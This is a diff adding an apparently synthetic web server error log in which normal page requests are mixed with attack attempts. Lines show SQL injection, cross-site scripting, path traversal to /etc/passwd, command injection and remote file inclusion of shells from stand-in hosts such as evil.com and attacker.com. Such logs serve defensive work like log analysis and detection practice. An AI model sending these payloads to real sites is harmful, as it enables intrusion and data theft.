@@ -1,0 +1,34 @@
+[Mon Jan 20 08:12:34.123456 2025] [php:error] [pid 28751] [client 192.168.10.45:12345] script '/var/www/html/profile.php' accessed with parameters '?user=admin'
+[Mon Jan 20 08:15:42.234567 2025] [php:error] [pid 28752] [client 192.168.10.45:12380] script '/var/www/html/search.php' accessed with parameters '?q=product'
+[Mon Jan 20 08:23:17.345678 2025] [php:error] [pid 28753] [client 192.168.10.45:12410] script '/var/www/html/login.php' accessed with parameters '?user=admin&password=password'
+[Mon Jan 20 08:31:05.456789 2025] [php:error] [pid 28754] [client 192.168.10.45:12450] script '/var/www/html/profile.php' accessed with parameters '?user=admin OR 1=1 -- ' 
+[Mon Jan 20 08:45:22.567890 2025] [php:error] [pid 28755] [client 192.168.10.45:12490] script '/var/www/html/product.php' accessed with parameters '?id=123'
+[Mon Jan 20 08:53:14.678901 2025] [php:error] [pid 28756] [client 192.168.10.45:12520] script '/var/www/html/contact.php' accessed with parameters '?message=Hello'
+
+[Mon Jan 20 09:10:28.789012 2025] [php:error] [pid 28757] [client 10.0.15.78:23456] script '/var/www/html/search.php' accessed with parameters '?q=product UNION SELECT username,password FROM users -- '
+[Mon Jan 20 09:17:39.890123 2025] [php:error] [pid 28758] [client 10.0.15.78:23490] script '/var/www/html/login.php' accessed with parameters '?user=test&password=test'
+[Mon Jan 20 09:24:46.901234 2025] [php:error] [pid 28759] [client 10.0.15.78:23520] script '/var/www/html/profile.php' accessed with parameters '?user=<script>alert(document.cookie)</script>'
+[Mon Jan 20 09:35:57.012345 2025] [php:error] [pid 28760] [client 10.0.15.78:23550] script '/var/www/html/product.php' accessed with parameters '?id=123'
+[Mon Jan 20 09:42:08.123456 2025] [php:error] [pid 28761] [client 10.0.15.78:23580] script '/var/www/html/dashboard.php' not found or unable to stat
+[Mon Jan 20 09:51:19.234567 2025] [php:error] [pid 28762] [client 10.0.15.78:23610] script '/var/www/html/about.php' not found or unable to stat
+
+[Mon Jan 20 10:05:24.345678 2025] [php:error] [pid 28763] [client 64.233.160.12:34567] script '/var/www/html/upload.php' accessed with parameters '?file=../../../etc/passwd'
+[Mon Jan 20 10:12:35.456789 2025] [php:error] [pid 28764] [client 64.233.160.12:34590] script '/var/www/html/config.php' accessed with parameters '?template=http://malicious.com/backdoor.php'
+[Mon Jan 20 10:20:46.567890 2025] [php:error] [pid 28765] [client 64.233.160.12:34620] script '/var/www/html/execute.php' accessed with parameters '?cmd=ping -c 5 10.0.0.1'
+[Mon Jan 20 10:28:57.678901 2025] [php:error] [pid 28766] [client 64.233.160.12:34650] script '/var/www/html/product.php' accessed with parameters '?id=123'
+[Mon Jan 20 10:34:08.789012 2025] [php:error] [pid 28767] [client 64.233.160.12:34680] script '/var/www/html/shop.php' accessed with parameters '?category=electronics'
+[Mon Jan 20 10:40:19.890123 2025] [php:error] [pid 28768] [client 64.233.160.12:34710] script '/var/www/html/contact.php' accessed with parameters '?message=Question about order'
+
+[Mon Jan 20 11:04:23.901234 2025] [php:error] [pid 28769] [client 91.14.223.175:45678] script '/var/www/html/login.php' accessed with parameters '?user=admin" OR "1"="1'
+[Mon Jan 20 11:15:34.012345 2025] [php:error] [pid 28770] [client 91.14.223.175:45720] script '/var/www/html/page.php' accessed with parameters '?file=<iframe src=javascript:alert(`xss`)></iframe>'
+[Mon Jan 20 11:23:45.123456 2025] [php:error] [pid 28771] [client 91.14.223.175:45750] script '/var/www/html/exec.php' accessed with parameters '?command=cat /etc/passwd'
+[Mon Jan 20 11:31:56.234567 2025] [php:error] [pid 28772] [client 91.14.223.175:45780] script '/var/www/html/api.php' accessed with parameters '?include=http://evil.com/backdoor.php'
+[Mon Jan 20 11:42:07.345678 2025] [php:error] [pid 28773] [client 91.14.223.175:45810] script '/var/www/html/product.php' accessed with parameters '?id=123'
+[Mon Jan 20 11:50:18.456789 2025] [php:error] [pid 28774] [client 91.14.223.175:45840] script '/var/www/html/cart.php' accessed with parameters '?action=add&id=456'
+
+[Mon Jan 20 12:03:29.567890 2025] [php:error] [pid 28775] [client 178.62.89.34:56789] script '/var/www/html/search.php' accessed with parameters '?q=DROP TABLE users--'
+[Mon Jan 20 12:11:30.678901 2025] [php:error] [pid 28776] [client 178.62.89.34:56810] script '/var/www/html/process.php' accessed with parameters '?data=<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs="))</script>'
+[Mon Jan 20 12:19:41.789012 2025] [php:error] [pid 28777] [client 178.62.89.34:56840] script '/var/www/html/file.php' accessed with parameters '?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+[Mon Jan 20 12:27:52.890123 2025] [php:error] [pid 28778] [client 178.62.89.34:56870] script '/var/www/html/admin.php' accessed with parameters '?action=exec&cmd=system("ls -la")'
+[Mon Jan 20 12:35:03.901234 2025] [php:error] [pid 28779] [client 178.62.89.34:56900] script '/var/www/html/include.php' accessed with parameters '?file=http://attacker.com/shell.php%00'
+[Mon Jan 20 12:42:14.012345 2025] [php:error] [pid 28780] [client 178.62.89.34:56930] script '/var/www/html/dashboard.php' accessed with parameters '?user=admin'
